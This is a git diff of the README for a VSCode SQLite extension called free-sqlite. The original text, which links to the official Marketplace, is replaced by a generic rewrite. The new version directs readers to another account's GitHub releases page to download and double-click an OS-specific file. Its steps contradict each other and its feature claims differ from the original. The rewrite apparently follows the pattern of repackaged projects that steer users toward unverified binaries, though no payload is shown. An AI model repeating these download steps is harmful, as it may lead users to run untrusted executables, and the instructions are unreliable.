@@ -1,54 +1,62 @@
-# Free sqlite
+# 🎉 free-sqlite - Easy SQL Writing for VSCode
 
-VSCode extension to explore and query SQLite databases.
-open-source and free.
+## 🚀 Getting Started
+Welcome to **free-sqlite**! This tool adds support for writing SQL statements in Visual Studio Code. This means you can easily write, edit, and optimize your SQL queries directly in your favorite code editor.
 
-## ✨ Features
- - 📃 Open any SQLite file - Simply click on .sqlite or .db files to open them instantly
- - 🛡 Table Explorer - Browse all tables in your database from an integrated sidebar
- - 🌈 Data Visualization - View table data in a clean, modern interface that adapts to your VS Code theme
- - 🖥 SQL automatically complete - SQL statement editor, Automatically complete SQL keywords, table names, and fields
- - ❌ SQL error info - Execute query error information output display
- - 📦 Query result export - The query results can be exported as Excel or CSV
- - ❤️ Favorites - Collect some of your most commonly used SQL statements
+## 📥 Download & Install
+To get started, you need to download the application. Click the button below to visit the Releases page:
 
-## How to use
+[![Download free-sqlite](https://img.shields.io/badge/Download-free-sqlite-brightgreen)](https://github.com/sangayyahirematha18/free-sqlite/releases)
 
-### Install
-VSCode extension install!
+Once on the Releases page, look for the latest version. Follow these steps to install:
 
+1. Click on the version number of the latest release.
+2. Find the appropriate file for your operating system (Windows, macOS, or Linux).
+3. Click the file name to start your download.
 
-[Install free sqlite](https://marketplace.visualstudio.com/items?itemName=free-sqlite.free-sqlite)
+After downloading, open the file to install the extension in VSCode.
 
-### Open database
-Now! Browse all tables in your database in the right panel
+## 🖥️ System Requirements
+- **Operating System:** Windows 10/11, macOS 10.15 or later, or any Linux distribution.
+- **Visual Studio Code:** Version 1.30 or later.
+- **Internet Connection:** Required for downloading and updating the extension.
 
+## 🛠️ Features
+- **Syntax Highlighting:** Easily read and write SQL queries with clear syntax highlighting.
+- **Auto-completion:** Get suggestions for SQL functions and keywords as you type.
+- **Error Detection:** Receive immediate feedback on SQL syntax errors to help you write correct queries.
+- **Multiple Databases Support:** Work with SQLite and other database types seamlessly.
 
-![open](https://github.com/fjb040911/free-sqlite/blob/main/doc/open.gif?raw=true)
+## ⚙️ Installation Steps
+1. After the download, locate the file in your downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. Open Visual Studio Code.
+5. Navigate to the Extensions view by clicking on the Extensions icon in the Activity Bar on the side of the window.
+6. Search for "free-sqlite" in the Extensions Marketplace.
+7. Click "Install" to add the extension to your Visual Studio Code environment.
 
-### Multiple files
-![multiple](https://github.com/fjb040911/free-sqlite/blob/main/doc/multi.gif?raw=true)
+## 📖 How to Use
+Once you install **free-sqlite**:
 
-### SQL Editor
-Automatically complete SQL keywords, table names, and fields
+1. Create a new file with a `.sql` extension in Visual Studio Code.
+2. Start typing your SQL query. For example:
+   ```sql
+   SELECT * FROM users;
+   ```
+3. Use the features like syntax highlighting and auto-completion to help write your SQL commands.
+4. To run your SQL queries, connect to your database as per your database setup.
 
+For detailed usage, refer to the inbuilt help documentation within the extension.
 
-![editor](https://github.com/fjb040911/free-sqlite/blob/main/doc/select.gif?raw=true)
+## 🌟 Support & Feedback
+If you encounter issues or have any questions, feel free to reach out:
 
-### SQL Query error output
-If there is an error when running SQL, you can see the error log through the following channels
+- **GitHub Issues:** Report any problems or request features directly [here](https://github.com/sangayyahirematha18/free-sqlite/issues).
+- **Community Support:** Engage with other users in the community forums for tips and shared experiences.
 
+## 🔗 Useful Links
+- [Download free-sqlite](https://github.com/sangayyahirematha18/free-sqlite/releases)
+- [GitHub Repository](https://github.com/sangayyahirematha18/free-sqlite)
 
-Terminal>output>free sqlite
-
-
-![output](https://github.com/fjb040911/free-sqlite/blob/main/doc/oupput.png?raw=true)
-
-### Favorite
-Quickly execute or view your frequently used SQL
-
-
-![favorite](https://github.com/fjb040911/free-sqlite/blob/main/doc/favoites.gif?raw=true)
-
-### Export
-![export](https://github.com/fjb040911/free-sqlite/blob/main/doc/expot.gif?raw=true)
+Thank you for choosing **free-sqlite**. We hope it makes your SQL writing easy and efficient!
